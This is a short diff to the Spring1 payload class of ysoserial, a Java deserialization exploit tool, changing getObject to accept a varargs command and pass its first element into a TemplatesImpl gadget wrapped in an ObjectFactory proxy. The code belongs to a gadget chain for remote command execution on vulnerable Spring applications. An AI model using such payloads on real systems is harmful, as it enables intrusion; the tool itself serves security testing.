@@ -53,8 +53,8 @@ import ysoserial.payloads.util.Reflections;
 @Authors({ Authors.FROHOFF })
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+	public Object getObject(final String ... command) throws Exception {
+		final Object templates = Gadgets.createTemplatesImpl(command[0]);
 
 		final ObjectFactory objectFactoryProxy =
 				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
